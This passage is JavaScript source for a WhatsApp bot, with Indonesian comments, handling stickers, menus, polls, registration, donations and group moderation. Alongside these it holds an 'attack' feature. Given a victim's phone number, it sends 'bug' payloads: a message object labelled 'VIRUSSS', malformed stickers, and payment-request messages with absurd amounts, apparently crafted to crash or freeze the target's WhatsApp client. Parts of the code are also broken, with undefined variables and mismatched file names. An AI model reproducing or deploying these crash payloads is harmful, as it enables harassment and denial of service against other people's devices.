				"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
				"totalAmount1000": "500000000000000",
				"totalCurrencyCode": "IDR"
			}
		}
	}
// ENDED VIRUSSS
// Slebewww
const finv = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "120363022284397832@g.us",
			"inviteCode": `${ucapin} ${pushname}`,
			"groupName": `${ucapin} ${pushname}`, 
            "caption": `${ucapin} ${pushname}`, 
            'jpegThumbnail': thumb
		}
	}
}
const rpy = (jid, teks) => {
satzz.relayMessage(jid, { text: teks }, { quoted: finv })
        }
   const copyNForward = async (jid, message, forceForward = false, options = {}) => {
        let vtype
		if (options.readViewOnce) {
			message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
			vtype = Object.keys(message.message.viewOnceMessage.message)[0]
			delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
			delete message.message.viewOnceMessage.message[vtype].viewOnce
			message.message = {
				...message.message.viewOnceMessage.message
			}
		}

        let mtype = Object.keys(message.message)[0]
        let content = await generateForwardMessageContent(message, forceForward)
        let ctype = Object.keys(content)[0]
		let context = {}
        if (mtype != "conversation") context = message.message[mtype].contextInfo
        content[ctype].contextInfo = {
            ...context,
            ...content[ctype].contextInfo
        }
        const waMessage = await generateWAMessageFromContent(jid, content, options ? {
            ...content[ctype],
            ...options,
            ...(options.contextInfo ? {
                contextInfo: {
                    ...content[ctype].contextInfo,
                    ...options.contextInfo
                }
            } : {})
        } : {})
        await satzz.relayMessage(jid, waMessage.message, { messageId:  waMessage.key.id })
        return waMessage
    }
    
		const resize = async (image, width, height) => {
       let oyy = await Jimp.read(image)
       let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
       return kiyomasa
      }
    /** Profile Image
      *
      * @param {Buffer} Buffer (Only Image)
      * @param {Numeric} Width
      * @param {Numeric} Height
      */
  const generateProfilePicture = async (buffer) => {
	const jimp = await Jimp.read(buffer)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(Jimp.MIME_JPEG),
		preview: await cropped.scaleToFit(720, 720).getBufferAsync(Jimp.MIME_JPEG)
	}
}
  const updateProfilePicture = async (jid, buffer) => {
let { img, preview } = await generateProfilePicture(buffer) 
         await satzz.query({
             tag: 'iq',
             attrs: {
                to: jid,
                type: 'set',
                xmlns: 'w:profile:picture'
             },
             content: [{
                 tag: 'picture',
                 attrs: {
                    type: 'image'
                 },
                    content: img
             }]
         })
         }
   const getBff = async (url, options) => {
	try {
		options ? options : {}
		const res = await axios({
			method: "get",
			url,
			headers: {
				'DNT': 1,
				'Upgrade-Insecure-Request': 1
			},
			...options,
			responseType: 'arraybuffer'
		})
		return res.data
	} catch (err) {
		return err
	}
}
satzz.decodeJid = (jid) => {
        if (!jid) return jid
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {}
            return decode.user && decode.server && decode.user + '@' + decode.server || jid
        } else return jid
    }
    
satzz.ev.on('contacts.update', update => {
        for (let contact of update) {
            let id = satzz.decodeJid(contact.id)
            if (store && store.contacts) store.contacts[id] = { id, name: contact.notify }
        }
    })

    satzz.getName = (jid, withoutContact  = false) => {
       var id = satzz.decodeJid(jid)
       var withoutContact = satzz.withoutContact || withoutContact 
        let v
        if (id.endsWith("@g.us")) return new Promise(async (resolve) => {
            v = store.contacts[id] || {}
            if (!(v.name || v.subject)) v = satzz.groupMetadata(id) || {}
            resolve(v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international'))
        })
        else v = id === '0@s.whatsapp.net' ? {
            id,
            name: 'WhatsApp'
        } : id === satzz.decodeJid(satzz.user.id) ?
            satzz.user :
            (store.contacts[id] || {})
            return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')
    }

// SetBot

// Menfess 
const menfessAdd = (dr, kpd) => {
        const obj = { dari: dr, kepada: kpd, status: true }
        menfess.push(obj)
        fs.writeFileSync('./lib/menfess.json', JSON.stringify(menfess, null, 2))
        }
        const checkMenfess = (to, menfess) => {
        let status = false
        Object.keys(menfess).forEach((i) => {
        if (menfess[i].kepada === to) {
            status = true
        }
        })
        return status
        }
const isTo = checkMenfess(sender, menfess)
        const checkF = (from, menfess) => {
        let status = false
        Object.keys(menfess).forEach((i) => {
        if (menfess[i].dari === from ) {
            status = true
        }
        })
        return status
        }
        const checkog = (sender, menfess) => {
        let status = false
        Object.keys(menfess).forEach((i) => {
        if (menfess[i].status === true) {
            status = true
        }
        })
        return status
        }
        const isMenfess = checkog(sender, menfess)
        const isSend = checkF(sender, menfess)
        // Batass menfess

    
    
    
    
    
   satzz.sendContact = async (kon, name, quoted = '', options = {}) => {
	let list = []
	for (let i of kon) {
	    list.push({
	    	displayName: name,
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:$|\nFN:${name}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Ponsel\nitem2.EMAIL;type=INTERNET:satganzdevs@gmail.com\nitem2.X-ABLabel:Email\nitem3.URL:https://bit.ly/SatganzDevs\nitem3.X-ABLabel:Instagram\nitem4.ADR:;;Indonesia;;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	satzz.sendMessage(from, { contacts: { displayName: `${list.length} Kontak`, contacts: list }, ...options }, { quoted })
    }
    const send5ButImg = async (jid , text = '' , footer = '', img, but = [], options = {}) =>{
        let message = await prepareWAMessageMedia({ image: img }, { upload: satzz.waUploadToServer })
        var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
        templateMessage: {
        hydratedTemplate: {
        imageMessage: message.imageMessage,
               "hydratedContentText": text,
               "hydratedFooterText": footer,
               "hydratedButtons": but
            }
            }
            }), options)
            satzz.relayMessage(jid, template.message, { messageId: template.key.id })
    }
    function nullish(args) {
    return !(args !== null && args !== undefined)
}

 const sendPayment = async (jid, amount, currency, text = '', from, image, options) => {
    const requestPaymentMessage = { amount: {
            currencyCode: currency,
            offset: 0,
            value: amount
        },
        expiryTimestamp: 0,
        amount1000: amount,
        currencyCodeIso4217: currency,
        requestFrom: from,
        noteMessage: {
            extendedTextMessage: {
                text: text
            }
        },
        background: thumb
    }
    satzz.relayMessage(jid, { requestPaymentMessage }, { ...options });
}
satzz.sendButLoc = async (jid, buffer, contentText, footer, buttons1, row1, quoted, options) => {
const template = generateWAMessageFromContent(jid, proto.Message.fromObject({
      templateMessage: {
        hydratedTemplate: {
          locationMessage: { jpegThumbnail: file },
          hydratedContentText: contentText,
          hydratedFooterText: footer,
          ...options,
          hydratedButtons: [{
            urlButton: {
              displayText: global.dtu,
              url: global.urlnya
            }
          },
          {
            quickReplyButton: {
              displayText: buttons1,
              id: row1
            }
          }]
        }
      }
    }), { userJid: satzz.user.jid, quoted: quoted, contextInfo: { mentionedJid: parseMention(contentText + footer) }, ephemeralExpiration: 86400, ...options });
    return await satzz.relayMessage(jid, template.message, { messageId: template.key.id })
   }
   satzz.sendGroupV4Invite = async (jid, participant, inviteCode, inviteExpiration, caption = 'Invitation to join my WhatsApp group', options = {}) => {
                const msg = proto.Message.fromObject({
                    groupInviteMessage: proto.GroupInviteMessage.fromObject({
                        inviteCode,
                        inviteExpiration: inviteExpiration,
                        groupJid: jid,
                        groupName: await satzz.getName(jid),
                        jpegThumbnail: thumb,
                        caption
                    })
                })
                const message = generateWAMessageFromContent(participant, msg, options)
                await satzz.relayMessage(participant, message.message, { messageId: message.key.id, additionalAttributes: { ...options } })
                return message
        }
const butMenu = [{ urlButton: {displayText: 'WHATSAPP GROUP', url: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`}}, { quickReplyButton: { displayText: 'ONWER', id: '.owner'}}, { quickReplyButton: { displayText: 'DONATE', id: '.donasi'}}]
const butDefault = [{ urlButton: {displayText: 'WHATSAPP GROUP', url: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`}}, { quickReplyButton: { displayText: 'ONWER', id: '.owner'}}, { quickReplyButton: { displayText: 'DONATE', id: '.donasi'}},{ quickReplyButton: { displayText: 'MENU', id: '.menu'}}]
const sendDaftar = async (jid) => {
let cap = `${ucapin} - @${sender.split('@')[0]}\n\nKamu belum terdaftar di Database bot, Silahkan mendaftar terlebih dahulu, tekan tombol di bawah`
try { var pp_user = await satzz.profilePictureUrl(i, 'image') } catch { var pp_user = fs.readFileSync('./media/pp_kosong.png') }
let regisMessage = {
image: pp_user,
caption : cap,
footer : footer,
buttons: [{ buttonId: '.daftar', buttonText: { displayText: 'D A F T A R' }, type: 1 }],
mentions: [sender],
headerType: 2,
        }
satzz.sendMessage(jid, regisMessage)
}
const sendKatalog = async (jid , title = '' , mess = '', desc = '', gam , options = {}) =>{
let message = await prepareWAMessageMedia({ image: gam }, { upload: satzz.waUploadToServer })
const toduh = generateWAMessageFromContent(jid,
{"productMessage": {
"product": {
"productImage": message.imageMessage,
"title": title,
"message": mess,
"description": desc,
"currencyCode": "IDR",
"priceAmount1000": "1",
"url": `https://wa.me/p/5256709924440975/6281372187304`,
"retailerId": `1`,
"productImageCount": 1,
"salePriceAmount1000": "50000"
},
"businessOwnerJid": `6281372187304@s.whatsapp.net`
}
}, options)
return satzz.relayMessage (jid, toduh.message, {messageId: toduh.key.id})
}
const del = async (mess) => {
await satzz.sendMessage(from, { delete: { fromMe: false, remoteJid: from, id: mess, participant: sender } })
}

satzz.sendButLoc = async (jid, buffer, contenText, footerText, btn1, id1, quoted, options = {}) => {
let buttonMessage = {
location: { jpegThumbnail: fs.readFileSync('./media/who.jpg') },
caption: contenText,
footer: footerText,
mentions: await parseMention(contenText + footerText),
...options,
buttons: [{ buttonId: id1, buttonText: { displayText: btn1 }, type: 1 }],
headerType: 6
}
satzz.sendMessage(jid, buttonMessage, { quoted, upload: satzz.waUploadToServer, ephemeralExpiration: global.ephemeral, mentions: await parseMention(contenText + footerText), ...options})
}

            satzz.send5ButMsg = (jid, text = '' , footer = '', but = []) =>{
        let templateButtons = but
        var templateMessage = {
        text: text,
        footer: footer,
        templateButtons: templateButtons
        }
        satzz.sendMessage(jid, templateMessage)
        }    
        
        
        
        
        satzz.send5ButImg = async (jid , text = '' , footer = '', img, but = [], options = {}) =>{
        let message = await prepareWAMessageMedia({ image: img }, { upload: satzz.waUploadToServer })
        var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
        templateMessage: {
        hydratedTemplate: {
        imageMessage: message.imageMessage,
               "hydratedContentText": text,
               "hydratedFooterText": footer,
               "hydratedButtons": but
            }
            }
            }), options)
           	 satzz.relayMessage(jid, template.message, { messageId: template.key.id })
    		}

    /** Send Button 5 Video
     *
     * @param {*} jid
     * @param {*} text
     * @param {*} footer
     * @param {*} Video
     * @param [*] button
     * @param {*} options
     * @returns
     */
    satzz.send5ButVid = async (jid , text = '' , footer = '', vid, but = [], options = {}) =>{
        let message = await prepareWAMessageMedia({ video: vid }, { upload: satzz.waUploadToServer })
        var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
        templateMessage: {
        hydratedTemplate: {
        videoMessage: message.videoMessage,
               "hydratedContentText": text,
               "hydratedFooterText": footer,
               "hydratedButtons": but
            }
            }
            }), options)
            satzz.relayMessage(jid, template.message, { messageId: template.key.id })
    }

    /** Send Button 5 Gif
     *
     * @param {*} jid
     * @param {*} text
     * @param {*} footer
     * @param {*} Gif
     * @param [*] button
     * @param {*} options
     * @returns
     */
    satzz.send5ButGif = async (jid , text = '' , footer = '', gif, but = [], options = {}) =>{
        let message = await prepareWAMessageMedia({ video: gif, gifPlayback: true }, { upload: satzz.waUploadToServer })
        var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
        templateMessage: {
        hydratedTemplate: {
        videoMessage: message.videoMessage,
               "hydratedContentText": text,
               "hydratedFooterText": footer,
               "hydratedButtons": but
            }
            }
            }), options)
            satzz.relayMessage(jid, template.message, { messageId: template.key.id })
    }

    /**
     * 
     * @param {*} jid 
     * @param {*} buttons 
     * @param {*} caption 
     * @param {*} footer 
     * @param {*} quoted 
     * @param {*} options 
     */
    satzz.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
        let buttonMessage = {
            text,
            footer,
            buttons,
            headerType: 2,
            ...options
        }
        satzz.sendMessage(jid, buttonMessage, { quoted, ...options })
    }
                
                
    
	
        //Auto Respon
        satzz.readMessages([sat.key])
		satzz.sendPresenceUpdate('composing', from)
	
                
                
                
        const pM = async (text = '') => {
	return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
	}
                function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
  }
  function randomId(n) {
      for (var bytes = []; n > 0; n--)
        bytes.push(Math.floor(Math.random() * 256))
      return bytes
    }
                
               
                
                
                
                
                
switch (command) { 
case 'vote':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroupAdmins) return reply('Lu bukan admin mek')
let sendPoll = async (jid, name = '', optiPoll, options) => {
if (!Array.isArray(optiPoll[0]) && typeof optiPoll[0] === 'string') optiPoll = [optiPoll]
if (!options) options = {}
let byy = await satzz.getName(sender)
const pollMessage = {
name: `Request Polling by ${byy}\n\n*${name}*`,
options: optiPoll.map(btn => ({
optionName: !nullish(btn[0]) && btn[0] || ''
})),
selectableOptionsCount: 1
}
return satzz.relayMessage(jid, { pollCreationMessage: pollMessage }, { ...options });
}
let a = []
let b = q.split('&')
for (var cebok = 1; cebok < b.length; cebok++) {
a.push([b[cebok]])
}
sendPoll(from, q1, a, sat)
break
case 'setppbot':
case 'setbotpp':
if (!isOwner) return reply('Luwh siapa?')
let medias = await downloadContentFromMessage(sat.message.imageMessage || sat.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
var buffer = Buffer.from([])
for await(const chunk of medias) {buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync('./botpp.jpg', buffer)
const image = fs.readFileSync('./botpp.jpg')
await updateProfilePicture(botNumber, image)
reply('success')
await fs.unlinkSync(medias)
break
case 'setppgc':
case 'setppgrup':
case 'setppgroup':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroupAdmins) return reply('only admins')
if (!isBotGroupAdmins) return reply('Bot Bukanlah Admin!')
if (!isGroup) return reply('Grup Only!')
let mediar = await downloadContentFromMessage(sat.message.imageMessage || sat.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
var buffers = Buffer.from([])
for await(const chunk of mediar) {buffers = Buffer.concat([buffers, chunk])}
fs.writeFileSync('./ppgrup.jpg', buffers)
const iimage = fs.readFileSync('./ppgc.jpg')
await updateProfilePicture(from, iimage)
reply('success')
await fs.unlinkSync(medias)
break
case 'hacker':
case 'heker':
var heker = ["Dear kamu yang tertulis di halaman defacementku, Kapan jadi pacarku?","Aku rela ko jadi Processor yg kepanasan, asalkan kmu yg jadi heatsink'y yg setiap saat bisa mendinginkan ku.","Gak usah nyari celah xss deh, karena ketika kamu ngeklik hatiku udah muncul pop up namamu.","berharap setelah aku berhasil login di hati kamu ga akan ada tombol logout, dan sessionku ga bakal pernah expired.","Masa aku harus pake teknik symlink bypass buat buka-buka folder hatimu yg open_basedir enabled.","Diriku dan Dirimu itu ibarat PHP dan MySQL yang belum terkoneksi.","Jangan cuma bisa inject hatinya,tapi harus bisa patchnya juga. Biar tidak selingkuh sama hacker lain.","Aku memang programmer PHP,tapi aku nggak akan php-in kamu kok.","Eneeeng. | Apache? | Km wanita yg paling Unix yg pernah aku kenal |","Sayang, capslock kamu nyala ya? | ngga, kenapa emangnya? | soalnya nama kamu ketulis gede bgt di hati aku | zzz! smile","Aku deketin kamu cuma untuk redirect ke hati temenmu.","Domain aja bisa parkir, masa cintaku ga bisa parkir dihatimu?","Aku boleh jadi pacarmu? | 400(Bad Request) | Aku cium boleh? | 401(Authorization Required) | Aku buka bajumu yah | 402(Payment Required) sad","kamu tau ga beda'y kamu sama sintax PHP, kalo sintax PHP itu susah di hafalin kalo kamu itu susah di lupain","Kamu dulu sekolah SMK ambil kejuruan apa? | Teknik Komputer Jaringan | Terus sekarang bisa apa aja? | Menjaring hatimu lewat komputerku | biggrin","Jika cinta itu Array, maka,cintaku padamu tak pernah empty jika di unset().","SQLI ( Structured Query Love Injection )","aku ingin kamu rm -rf kan semua mantan di otak mu,akulah root hati kamu","Senyumu bagaikan cooler yang menyejukan hatiku ketika sedang overclock.","kamu adalah terminalku, dimana aku menghabiskan waktuku untuk mengetikan beribu baris kode cinta untukmu smile","Aku seneng nongkrong di zone-h, karena disanalah aku arsipkan beberapa website yang ada foto kamunya.","hatiku ibarat vps hanya untukmu saja bukan shared hosting yg bisa tumpuk berbagai domain cinta.","Aku bukanlah VNC Server Tanpa Authentication yg bisa kamu pantau kapan saja.","Jangan men-dualboot-kan hatiku kepadamu.","cintaku kan ku Ctrl+A lalu kan ku Ctrl+C dan kan ku Ctrl+V tepat di folder system hatimu.","KDE kalah Cantiknya, GNOME kalah Simplenya, FluxBox kalah Ringannya, pokonya Semua DE itu Kalah Sama Kamu.","Cintamu bagaikan TeamViewer yang selalu mengendalikan hatiku","cinta kita tak akan bisa dipisahkan walau setebal apapun itu firewall...!!"]
var qu = pickRandom(heker)            
satzz.send5ButMsg(from, qu, footer, [{ urlButton: {displayText: 'COPY', url: `https://www.whatsapp.com/otp/copy/${qu}`}}, { quickReplyButton: { displayText: 'NEXT', id: '.heker'}}])
break
// BRUTAL SEND BY 𝚂𝙰𝚃𝙶𝙰𝙽𝚉 𝙳𝙴𝚅𝚂 〄
case 'attack':
if (!q1) return reply(`> Masukkan\n${prefix + command} Nomer\n\n> Contoh?\n${prefix + command} 62xxx`)
var nyu = phone('+' + q1);
if (nyu.isValid == false) return reply("Nomer Yang anda masukkan tidak valid")
var cekontol = await satzz.onWhatsApp(nyu)
if (nyu + '@s.whatsapp.net' == sender) return reply('its your self bitch!')
if (!cekontol.length == 0) return reply(`Nomor tersebut tidak terdaftar di whatsapp\n\nMasukkan nomer yang valid/terdaftar di WhatsApp`)
var tgt = q1.replace(/[^@0-9]/g, '')+ "@s.whatsapp.net"
var satgnz = "6281316701742"
let isnoown = new RegExp(satgnz, 'i')
let isOwn = isnoown.test(text)
if (isOwn) return reply(`yow brow thats my owner, what are you doing?`)
satzz.sendMessage(from, {text: "ATTACKERS FEATURES", buttonText: "OPEN", sections: [{title: "PILIH", rows: [{title: "ALL BUG", rowId: '.allbug'+ q },{title: "BUG STICK", rowId: prefix + 'bugstik'+ q },{title: "BUG VN", rowId: prefix + 'bugvn'+ q },{title: "BUG TROLI", rowId: prefix + 'bugtroli'+ q } ]}]})
break
case 'bugstik':
satzz.sendMessage(q, { sticker : { url: thumb }}, { quoted: bugstik })
reply('SUKSESS SEND BUGSTIK TO'+ q)
break
case 'allbug':
satzz.sendMessage(q, { sticker : { url: thumb }, mimetype: 'image/webp'}, { quoted: bugstik })
await sleep(200)
satzz.sendMessage(q, { text: footer, contextInfo:{"externalAdReply": {"title": ` hehe`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": `https://wa.me/6281316701742`,"thumbnail": thumb,"sourceUrl": "https://wa.me/6281316701742"}}}, { quoted: virus})
await sleep(200)
satzz.relayMessage(q, { requestPaymentMessage: { Message: { TextMessage: { text: "hi", currencyCodeIso4217: 'IDR', requestFrom: '6281316701742@s.whatsapp.net', expiryTimestamp: 6281316701742, amount: 6281316701742, background: thumb }}}}, {})
break
case 'afk':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (cekUser("afk", sender) == true) return reply("Kamu Telah afk sebelumnya")
if (!q) return reply("Masukkan alasan Apa kamu afk")
reply(`[ *SUKSES AFK* ]\n• *User* : @${sender.split("@")[0]}\n• *Alasan* : ${q}\n\n~> [🤖] : Saya akan merespon jika ada yang mengTag @ anda, Saya juga menunggu anda kembali❤`)
setUser("±afk", sender, true)
setUser("±alasan", sender, q)
break
case 'menu':
if (cekUser("id", sender) == null) return sendDaftar(from)
const buttonMenu = {
image: thumb,
fileLength: 88808964843634667969,
caption: `${ucapin} - @${sender.split('@')[0]}\n\n` +help(prefix, reply, cekUser, namabot, sender),
footer: footer,
mentions: [sender],
templateButtons: butmenu,
headerType: 4,
contextInfo: { externalAdReply: { showAdAttribution: true,
mediaUrl: 'https://instagram.com/satganzdevs.xyz',
mediaType: 2, 
description: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq',
title: "Join Group Whatsapp Official",
body: footer,
thumbnail: thumb,
sourceUrl: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq'}}}
satzz.sendMessage(from, buttonMenu, { quoted : sat })
break
case 's':
case 'sticker':
case 'stiker':
case 'sgif':
case 'stickergif':
case 'stikergif':
if (cekUser("id", sender) == null) return sendDaftar(from)
try {
if (isMedia || isQuotedImage) { 
var stream = await downloadContentFromMessage(sat.message.imageMessage || sat.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
var buffer = Buffer.from([])
for await(const chunk of stream) {buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync('./res_buffer.jpg', buffer)
const image = './res_buffer.jpg'
await ffmpeg(image)
.input(image)
.on('error', function (error) { only("error", satzz, from) })
.on('end', function () {satzz.sendMessage(from, { sticker: {url: './mysticker.webp'}, mimetype: 'image/webp', contextInfo: { externalAdReply: { showAdAttribution: true, mediaUrl: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq', mediaType: 2, description: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq', title: "Don't Click", body: footer, thumbnail: thumb, sourceUrl: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq'}}})})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save('./mysticker.webp')} else if (isMedia || isQuotedVideo) {only("proses", satzz, from)
var stream = await downloadContentFromMessage(sat.message.videoMessage || sat.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
var buffer = Buffer.from([])
for await(const chunk of stream) {buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync('./res_buffer.mp4', buffer)
const video = './res_buffer.mp4'
await ffmpeg(video)
.input(video)
.on('error', function (error) {reply("error")
console.log(`${error}`)})
.on('end', function () { satzz.sendMessage(from, { sticker: {url: './mysticker2.webp' }, mimetype: 'image/webp', contextInfo: { externalAdReply: { showAdAttribution: true, mediaUrl: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq', mediaType: 2, description: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq', title: "Don't Click", body: footer, thumbnail: thumb, sourceUrl: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq'}}})})
.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
.toFormat('webp')
.save('./mysticker2.webp')} else {
reply('_Kirim gambar/video dengan caption !sticker/ reply gambar/video dengan perintah !sticker_ ')
}} catch (e) {only("error", satzz, from)}
break
case 'owner':
if (cekUser("id", sender) == null) return sendDaftar(from)
number = ["6281316701742"]
let contacts = []
var tol = "6281316701742@s.whatsapp.net"
var name = await satzz.getName(tol)
var biz = await conn.getBusinessProfile(tol)
let vcard = `
BEGIN:VCARD
VERSION:3.0
FN:${name.replace(/\n/g, '\\n')}
ORG:
item1.TEL;waid=${number}:${PhoneNumber('+' + number).getNumber('international')}
item1.X-ABLabel:📌 SAD BOY
item2.EMAIL;type=INTERNET:satganzdevs@gmail.com
item2.X-ABLabel:✉️ Email
X-WA-BIZ-DESCRIPTION:${(biz.description || '').replace(/\n/g, '\\n')}
X-WA-BIZ-NAME:${name.replace(/\n/g, '\\n')}
END:VCARD
`
contacts.push({ vcard, displayName: name })
satzz.sendMessage(from, {
            contacts: {
                displayName: `${contacts.length} kontak`, contacts: contacts }}, { quoted: sat})
break
case 'donasi': 
case 'donate':
case 'sewabot':
case 'sewa':
case 'donet':
satzz.send5ButMsg(from, '𝐃𝐎𝐍𝐀𝐓𝐈𝐎𝐍', footer, [{ urlButton: {displayText: 'GOPAY', url: `https://www.whatsapp.com/otp/copy/082398383300`}}, { urlButton: {displayText: 'DANA', url: `https://www.whatsapp.com/otp/copy/081316701742`}},{ urlButton: {displayText: 'SAWERIA', url: `https://saweria.co/SatganzDevs`}}])
break
case 'daftar': case 'login':
user.push({ id: sender, emote: "❤", timers: moment().format('LLL'), hit: 0, star: 1, afk: false, alasan:false, ban: false, premium: false })
fs.writeFileSync('./lib/data.json', JSON.stringify(user, null, 2))
let dat =`${ucapin} - @${sender.split('@')[0]}\n\n
• *User* : ${sender.split("@")[0]}
• *Star* : ⭐[1]
• *Hit* : 0
• *Premium* : false
• *Ban* : false
• *Afk* : false
Selamat @${sender.split("@")[0]} Anda berhasil bergabung ke database bot pada ${moment().format('LLL')}`
var pePe = await satzz.profilePictureUrl(sender, 'image')
satzz.send5ButImg(from, dat, footer, pePe)
break
case 'tobugstik':
if (cekUser("id", sender) == null) return sendDaftar(from)
try {
if (isMedia || isQuotedImage) { 
var stream = await downloadContentFromMessage(sat.message.imageMessage || sat.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
var buffer = Buffer.from([])
for await(const chunk of stream) {buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync('./res_buffer.jpg', buffer)
const image = './res_buffer.jpg'
await ffmpeg(image)
.input(image)
.on('error', function (error) { only("error", satzz, from) })
.on('end', function () {satzz.sendMessage(from, { sticker: {url: './mysticker.webp'}, mimetype: 'image/webp', contextInfo: { externalAdReply :{ mediaUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`, mediaType: 1, description: 'Join Group Official', title: '© 𝚂𝙰𝚃𝙶𝙰𝙽𝚉 𝙳𝙴𝚅𝚂 〄', body: footer, thumbnail: thumb, renderLargerThumbnail: 1, sourceUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`}}}, { quoted: bugstik })})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save('./mysticker.webp')} else if (isMedia || isQuotedVideo) {only("proses", satzz, from)
var stream = await downloadContentFromMessage(sat.message.videoMessage || sat.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
var buffer = Buffer.from([])
for await(const chunk of stream) {buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync('./res_buffer.mp4', buffer)
const video = './res_buffer.mp4'
await ffmpeg(video)
.input(video)
.on('error', function (error) {reply("error")
console.log(`${error}`)})
.on('end', function () { satzz.sendMessage(from, { sticker: {url: './mysticker2.webp' }, mimetype: 'image/webp', contextInfo: { externalAdReply :{ mediaUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`, mediaType: 1, description: 'Join Group Official', title: '© 𝚂𝙰𝚃𝙶𝙰𝙽𝚉 𝙳𝙴𝚅𝚂 〄', body: footer, thumbnail: thumb, renderLargerThumbnail: 1, sourceUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`}}}, { quoted: bugstik })})
.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
.toFormat('webp')
.save('./mysticker2.webp')} else {
reply('_Kirim gambar/video dengan caption !sticker/ reply gambar/video dengan perintah !sticker_ ')
}} catch (e) {only("error", satzz, from)}
break
case 'bc':
case 'broadcast':
case 'bcall':
if (!isOwner) return reply('Lu siapa anying')
if (!q) return reply('Teksnya?')
var data = await store.chats.all()
reply(`mengirim broadcast ke ${data.length} Chats`)
for (let hot of data) {
let bcMess = {
image: thumb,
fileLength: 88808964843634667969,
caption: `*_BROADCAST_*\n\n{q}`,
footer: footer,
mentions: [hot.id],
templateButtons: butDefault,
headerType: 4
}
satzz.sendMessage(hot.id, buttonImage, { quoted : sat })
}
await sleep(1000)
reply(`success broadcast ke ${data.length} Chats`)
break
case 'kick': case 'remove':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", satzz, from)
if (!isGroupAdmins) return only("isGroupAdmins", satzz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", satzz, from)
if (Tag() == "") return reply("tag Orang yang mau anda kick")
satzz.sendMessage(from, {text:`Byeee Byeee @${Tag()[0].split("@")[0]}`, mentions:[`${Tag()[0].split("@")[0]}@s.whatsapp.net`]},{quoted:sat1}) 
await satzz.groupParticipantsUpdate(from, Tag(), "remove").catch(e => {only("error", satzz, from)})
break
case 'kicktime': 
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", satzz, from)
